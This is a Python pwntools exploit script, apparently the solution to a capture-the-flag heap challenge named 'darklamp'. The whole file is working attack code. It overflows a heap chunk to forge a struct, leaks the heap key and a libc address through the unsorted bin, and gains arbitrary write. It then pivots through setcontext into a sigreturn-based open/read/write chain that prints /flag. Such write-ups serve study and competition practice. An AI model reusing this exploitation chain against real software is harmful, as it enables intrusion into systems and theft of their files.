#!/usr/bin/env python3
from pwn import *
import os, re

context.binary = exe = ELF('./darklamp_patched')
libc = ELF('./libc.so.6')
context.arch = 'amd64'
# context.log_level = 'debug'

HOST = os.getenv('HOST', '127.0.0.1')
PORT = int(os.getenv('PORT', '8008'))

LENS_MAGIC = 0x706d616c6b726164
SEAL_MAGIC = 0x0ddba11c0ffee123
DREAM_MAGIC = 0x647265616d6f7277
UNSORTED_FD_OFF = 0x203b20


def start():
    if args.L:
        return process(os.path.abspath(exe.path), cwd=os.getcwd())
    return remote(HOST, PORT)

p = start()

def menu():
    p.recvuntil(b'> ')

def cmd(c):
    p.sendline(str(c).encode())

def light(sz, data):
    cmd(1)
    p.sendlineafter(b'oil: ', str(sz).encode())
    p.sendlineafter(b'flame: ', str(len(data)).encode())
    p.sendafter(b'spark: ', data)
    menu()

def pray():
    cmd(5)
    menu()

def _parse_byte(out):
    m = re.search(rb': ([0-9a-f]{2})', out)
    if not m:
        raise ValueError(out)
    return int(m.group(1), 16)

def look_byte():
    cmd(2)
    out = p.recvuntil(b'> ')
    return _parse_byte(out)

def aim(addr):
    cmd(3)
    p.sendlineafter(b'star: ', str(addr).encode())
    menu()

def whisper(data):
    cmd(4)
    p.sendlineafter(b'words: ', str(len(data)).encode())
    p.sendafter(b'murmur: ', data)
    menu()

def read_bytes(addr, n):
    aim(addr)
    return bytes(look_byte() for _ in range(n))

def read_qword(addr):
    return u64(read_bytes(addr, 8))

def write_mem(addr, data):
    aim(addr)
    whisper(data)

menu()

# Dead ember leaks PROTECT_PTR(pos, NULL) == chunk_addr >> 12 for the 0x40 tcache chunk.
heap_key = u64(bytes(look_byte() for _ in range(8)))
heap_page = heap_key << 12
log.info(f'ash key = {hex(heap_key)}')

# First light places the lens chunk in the freed 0x40 ember chunk; overflow into it.
fake_lens = flat(LENS_MAGIC, SEAL_MAGIC, 0, 0, 0x100, 0)
payload = b'A' * 0x100 + p64(0) + p64(0x41) + fake_lens
light(0x100, payload)

# The 0x40 tcache ember is reused by the lens.  Under the packaged chroot/local
# layout its page offset is stable; keep a small fallback scan for robustness.
g_lens = heap_page + 0x3e0
if read_qword(g_lens) != LENS_MAGIC or read_qword(g_lens + 8) != SEAL_MAGIC:
    g_lens = None
    for off in range(0x300, 0x500, 8):
        if read_qword(heap_page + off) == LENS_MAGIC and read_qword(heap_page + off + 8) == SEAL_MAGIC:
            g_lens = heap_page + off
            break
if g_lens is None:
    log.failure('lens not found')
    exit(1)
log.success(f'lens = {hex(g_lens)}')

# Allocator state machine: large moon, guard, then internal free.  The freed
# large chunk becomes the active focus, so look() leaks the unsorted fd.
pray(); pray(); pray()
unsorted = u64(bytes(look_byte() for _ in range(8)))
libc.address = unsorted - UNSORTED_FD_OFF
log.success(f'libc = {hex(libc.address)}')

rop = ROP(libc)
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]

scratch = libc.bss() + 0x800
ctx = scratch
rop_addr = scratch + 0x300
flag_addr = scratch + 0x1000
buf_addr = scratch + 0x1100

# SROP ORW chain in libc .bss.  No stack write is used.
parts = []
cursor = rop_addr

def srop_step(rax, rdi=0, rsi=0, rdx=0):
    global cursor
    chain_addr = cursor
    frame_addr = chain_addr + 0x18
    frame = SigreturnFrame()
    frame.rax = int(rax)
    frame.rdi = int(rdi)
    frame.rsi = int(rsi)
    frame.rdx = int(rdx)
    frame.rip = syscall_ret
    frame.rsp = frame_addr + len(bytes(frame))
    blob = flat(pop_rax, 15, syscall_ret, bytes(frame))
    parts.append(blob)
    cursor += len(blob)

srop_step(constants.SYS_close, 3, 0, 0)
srop_step(constants.SYS_openat, (1 << 64) - 100, flag_addr, 0)
srop_step(constants.SYS_read, 3, buf_addr, 0x80)
srop_step(constants.SYS_write, 1, buf_addr, 0x80)
srop_step(constants.SYS_exit, 0, 0, 0)
rop_blob = b''.join(parts)

uc = bytearray(0x300)
uc[0xa0:0xa8] = p64(rop_addr + 8)       # stack after setcontext's final ret
uc[0xa8:0xb0] = p64(pop_rax)            # first RIP
uc[0xe0:0xe8] = p64(ctx + 0x220)        # fldenv pointer
uc[0x1c0:0x1c4] = p32(0x1f80)           # mxcsr

write_mem(ctx, bytes(uc))
write_mem(rop_addr, rop_blob)
write_mem(flag_addr, b'/flag\0')

# Arm the dream trigger without touching stack: sleep calls focus(budget) when mood is magic.
setcontext = libc.sym['setcontext']
write_mem(g_lens + 0x10, flat(setcontext, 0, ctx, DREAM_MAGIC))

cmd(6)
p.recvuntil(b'good night\n')
data = p.recvall(timeout=2)
print(data.split(b'\0', 1)[0].decode(errors='ignore'))
